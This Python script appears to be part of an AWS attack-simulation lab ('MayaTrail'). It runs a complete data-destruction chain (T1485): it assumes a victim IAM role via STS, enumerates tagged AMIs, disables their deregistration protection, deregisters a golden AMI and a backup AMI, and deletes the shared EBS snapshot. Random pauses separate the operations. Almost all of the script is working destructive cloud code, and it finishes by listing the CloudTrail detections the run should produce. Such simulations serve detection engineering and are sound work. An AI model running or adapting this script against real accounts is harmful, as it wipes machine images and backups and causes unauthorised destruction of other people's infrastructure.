# FILE: attack.py
"""
ATOMIC_EC2_DEREGISTER_AMI -- Automated Post-Exploitation Attack Script
T1485 Data Destruction: Assumes victim IAM role, enumerates MayaTrail-tagged AMIs,
disables deregistration protection on both AMIs, deregisters them, then deletes the
shared backing EBS snapshot to complete the destruction chain.

Phases:
  1 - Victim Role Assumption (STS AssumeRole)
  2 - Data Destruction: AMI Deregistration and Snapshot Deletion
"""
import sys
import time
import random
import json
import pathlib
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output -- prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ── Resource names: single source of truth ──────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to defaults")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(infra, key, default=""):
    """Resolve a dynamic value via pulumi_export_keys -> infra dict -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key, default)


def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Resolve dynamic values from Pulumi stack outputs ─────────────────────
    _set_tenant_credentials(outputs)

    victim_role_arn    = _p(outputs, "victim_role_arn")
    golden_ami_id      = _p(outputs, "golden_ami_id")
    bait_ami_id        = _p(outputs, "bait_ami_id")
    source_snapshot_id = _p(outputs, "source_snapshot_id")

    if not victim_role_arn:
        raise RuntimeError("Required output 'victim_role_arn' missing from Pulumi stack outputs")
    if not golden_ami_id:
        raise RuntimeError("Required output 'golden_ami_id' missing from Pulumi stack outputs")
    if not bait_ami_id:
        raise RuntimeError("Required output 'bait_ami_id' missing from Pulumi stack outputs")
    if not source_snapshot_id:
        raise RuntimeError("Required output 'source_snapshot_id' missing from Pulumi stack outputs")

    # ── Resolve static names from resource_names.json ────────────────────────
    golden_ami_name = _r("golden_ami_name", "prod-golden-image-2024")
    bait_ami_name   = _r("bait_ami_name",   "prod-database-backup-ami-v3")
    victim_role_name = _r("victim_role_name", "atomic-ec2-deregister-ami-victim-role")

    events_generated = []

    try:
        # ── PHASE 1: Victim Role Assumption ──────────────────────────────────
        print_step("PHASE 1 - Victim Role Assumption (T1485)")
        print_step(f"Assuming victim role: {victim_role_arn}")

        sts = _base_session(region).client("sts")
        try:
            assume_resp = sts.assume_role(
                RoleArn=victim_role_arn,
                RoleSessionName="atomic-ec2-deregister-ami",
            )
            victim_creds = assume_resp["Credentials"]
            events_generated.append("AssumeRole -> sts.amazonaws.com")
            print_ok(f"Assumed victim role {victim_role_name}; session expires {victim_creds['Expiration']}")
        except ClientError as e:
            raise RuntimeError(f"STS AssumeRole failed: {e}") from e

        op_delay(1, 3)

        # Build EC2 client from victim temporary credentials
        victim_session = boto3.Session(
            aws_access_key_id=victim_creds["AccessKeyId"],
            aws_secret_access_key=victim_creds["SecretAccessKey"],
            aws_session_token=victim_creds["SessionToken"],
            region_name=region,
        )
        ec2 = victim_session.client("ec2", region_name=region)

        phase_delay()

        # ── PHASE 2: Data Destruction ─────────────────────────────────────────
        print_step("PHASE 2 - Data Destruction: AMI Deregistration and Snapshot Deletion (T1485)")

        # ── Step 2: Enumerate MayaTrail-tagged AMIs ───────────────────────────
        print_step("Step 2 - Enumerate MayaTrail-tagged AMIs via DescribeImages")
        try:
            describe_resp = ec2.describe_images(
                Filters=[
                    {"Name": "tag:MayaTrail", "Values": ["true"]},
                    {"Name": "state",         "Values": ["available"]},
                ],
                Owners=["self"],
            )
            images = describe_resp.get("Images", [])
            events_generated.append("DescribeImages -> ec2.amazonaws.com")
            print_ok(f"DescribeImages returned {len(images)} MayaTrail-tagged AMI(s)")
            for img in images:
                snap_ids = [
                    bdm["Ebs"]["SnapshotId"]
                    for bdm in img.get("BlockDeviceMappings", [])
                    if "Ebs" in bdm and "SnapshotId" in bdm["Ebs"]
                ]
                print_ok(f"  {img['ImageId']} ({img.get('Name', '')}) snapshots: {snap_ids}")
        except ClientError as e:
            raise RuntimeError(f"DescribeImages failed: {e}") from e

        op_delay(2, 4)

        # ── Step 3: Disable deregistration protection on golden AMI ──────────
        print_step(f"Step 3 - Disable deregistration protection on golden AMI {golden_ami_id} ({golden_ami_name})")
        # New AMIs have deregistration protection disabled by default; AccessDenied here
        # means the victim policy lacks this permission -- non-blocking.
        try:
            ec2.disable_image_deregistration_protection(ImageId=golden_ami_id)
            events_generated.append("DisableImageDeregistrationProtection (golden AMI) -> ec2.amazonaws.com")
            print_ok(f"Disabled deregistration protection on {golden_ami_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "UnauthorizedOperation"):
                print_err(f"DisableImageDeregistrationProtection access denied -- not in victim policy; AMIs unprotected by default: {code}")
            elif code == "InvalidAMIID.NotFound":
                print_err(f"Golden AMI {golden_ami_id} not found -- may already be deregistered")
            else:
                print_err(f"DisableImageDeregistrationProtection unexpected error: {code} -- {e}")

        op_delay(2, 5)

        # ── Step 4: Deregister golden AMI (T1485 core action) ────────────────
        print_step(f"Step 4 - Deregister golden AMI {golden_ami_id} ({golden_ami_name})")
        try:
            ec2.deregister_image(ImageId=golden_ami_id)
            events_generated.append(f"DeregisterImage ({golden_ami_name}) -> ec2.amazonaws.com")
            print_ok(f"[OK] Deregistered golden AMI {golden_ami_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "UnauthorizedOperation"):
                print_err(f"DeregisterImage access denied for golden AMI: {e}")
            elif code == "InvalidAMIID.NotFound":
                print_ok(f"Golden AMI {golden_ami_id} already deregistered (idempotent)")
                events_generated.append(f"DeregisterImage ({golden_ami_name}) -- already gone")
            else:
                raise RuntimeError(f"DeregisterImage failed for golden AMI: {e}") from e

        op_delay(3, 6)

        # ── Step 5: Disable deregistration protection on bait AMI ────────────
        print_step(f"Step 5 - Disable deregistration protection on bait AMI {bait_ami_id} ({bait_ami_name})")
        try:
            ec2.disable_image_deregistration_protection(ImageId=bait_ami_id)
            events_generated.append("DisableImageDeregistrationProtection (bait AMI) -> ec2.amazonaws.com")
            print_ok(f"Disabled deregistration protection on {bait_ami_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "UnauthorizedOperation"):
                print_err(f"DisableImageDeregistrationProtection access denied -- not in victim policy; AMIs unprotected by default: {code}")
            elif code == "InvalidAMIID.NotFound":
                print_err(f"Bait AMI {bait_ami_id} not found -- may already be deregistered")
            else:
                print_err(f"DisableImageDeregistrationProtection unexpected error: {code} -- {e}")

        op_delay(2, 5)

        # ── Step 6: Deregister bait AMI (multi-AMI T1485 coverage) ───────────
        print_step(f"Step 6 - Deregister bait AMI {bait_ami_id} ({bait_ami_name})")
        try:
            ec2.deregister_image(ImageId=bait_ami_id)
            events_generated.append(f"DeregisterImage ({bait_ami_name}) -> ec2.amazonaws.com")
            print_ok(f"[OK] Deregistered bait AMI {bait_ami_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "UnauthorizedOperation"):
                print_err(f"DeregisterImage access denied for bait AMI: {e}")
            elif code == "InvalidAMIID.NotFound":
                print_ok(f"Bait AMI {bait_ami_id} already deregistered (idempotent)")
                events_generated.append(f"DeregisterImage ({bait_ami_name}) -- already gone")
            else:
                raise RuntimeError(f"DeregisterImage failed for bait AMI: {e}") from e

        op_delay(3, 6)

        # ── Step 7: Delete shared backing snapshot ────────────────────────────
        # Both AMIs referenced the same snapshot; after deregistration the snapshot is
        # orphaned and can be deleted to complete the T1485 destruction chain.
        print_step(f"Step 7 - Delete shared backing snapshot {source_snapshot_id}")
        try:
            ec2.delete_snapshot(SnapshotId=source_snapshot_id)
            events_generated.append("DeleteSnapshot (shared AMI backing snapshot) -> ec2.amazonaws.com")
            print_ok(f"[OK] Deleted backing snapshot {source_snapshot_id}")
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDenied", "UnauthorizedOperation"):
                print_err(f"DeleteSnapshot access denied: {e}")
            elif code == "InvalidSnapshot.NotFound":
                print_ok(f"Snapshot {source_snapshot_id} already deleted (idempotent)")
                events_generated.append("DeleteSnapshot -- already gone")
            elif code == "InvalidSnapshot.InUse":
                # AMI deregistration is eventually consistent; snapshot may still be
                # registered as in-use for a few seconds after DeregisterImage returns.
                print_err(f"Snapshot still in use (AMI deregistration propagating): {e}")
            else:
                raise RuntimeError(f"DeleteSnapshot failed: {e}") from e

        op_delay(2, 5)

    finally:
        # ── Attack Summary ────────────────────────────────────────────────────
        # Runs even if a step raises -- no resources were created by this script,
        # so no cleanup is needed; STS session expires automatically.
        print("\n" + "=" * 62)
        print("ATTACK SUMMARY - ATOMIC_EC2_DEREGISTER_AMI")
        print("=" * 62)
        print(f"Victim role assumed : {victim_role_arn}")
        print(f"Golden AMI targeted : {golden_ami_id} ({golden_ami_name})")
        print(f"Bait AMI targeted   : {bait_ami_id} ({bait_ami_name})")
        print(f"Snapshot targeted   : {source_snapshot_id}")
        print(f"\nAudit events generated ({len(events_generated)}):")
        for ev in events_generated:
            print(f"  -> {ev}")
        print("\nExpected CloudTrail detections:")
        print("  -> AssumeRole from lab account targeting victim role")
        print("  -> DescribeImages enumeration via victim role credentials")
        print("  -> DisableImageDeregistrationProtection on golden AMI")
        print(f"  -> DeregisterImage on golden production AMI ({golden_ami_name})")
        print("  -> DisableImageDeregistrationProtection on bait backup AMI")
        print(f"  -> DeregisterImage on bait backup AMI ({bait_ami_name})")
        print("  -> DeleteSnapshot on shared AMI backing EBS snapshot")
        print("\nCleanup: STS session expires automatically after 1 hour.")
        print("Run 'pulumi destroy --refresh' to reconcile already-deleted resources.")
        print("=" * 62)
